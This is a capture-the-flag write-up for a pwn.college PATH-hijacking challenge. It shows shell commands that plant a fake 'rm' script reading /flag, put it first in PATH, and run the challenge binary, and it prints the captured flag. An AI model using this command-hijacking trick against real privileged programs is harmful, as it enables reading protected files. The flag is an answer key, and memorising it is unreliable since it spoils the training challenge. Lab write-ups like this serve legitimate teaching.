# Hijacking commands
This challenge asks us to make it such that running the /challenge/run program doesnt invoke the "rm" command as the rm command deletes the flag. But we cant just clear the PATH as we wont get the flag. So we create a fake "rm" script which contains commands to print the flag and we put it in PATH. This way the shell reads the fake rm before the real one and prints the flag before it gets deleted.
# My solve
**Flag**-pwn.college{QyjbFJsXoGHaF7PrMdlvhlxjb4m.QX3cjM1wyN5EzNzEzW}

>hacker@path~hijacking-commands:~$ which cat

>/run/dojo/bin/cat

>hacker@path~hijacking-commands:~$ cd ~/myscripts

>hacker@path~hijacking-commands:~/myscripts$ echo '#!/bin/bash' > rm

>hacker@path~hijacking-commands:~/myscripts$ echo '/run/dojo/bin/cat /flag' >> rm

>hacker@path~hijacking-commands:~/myscripts$ echo 'exit 0' >> rm

>hacker@path~hijacking-commands:~/myscripts$ cd

>hacker@path~hijacking-commands:~$ PATH=/home/hacker/myscripts

>hacker@path~hijacking-commands:~$ type rm

>rm is /home/hacker/myscripts/rm

>hacker@path~hijacking-commands:~$ /challenge/run

>Trying to remove /flag...

>pwn.college{QyjbFJsXoGHaF7PrMdlvhlxjb4m.QX3cjM1wyN5EzNzEzW}

# Reference 
None
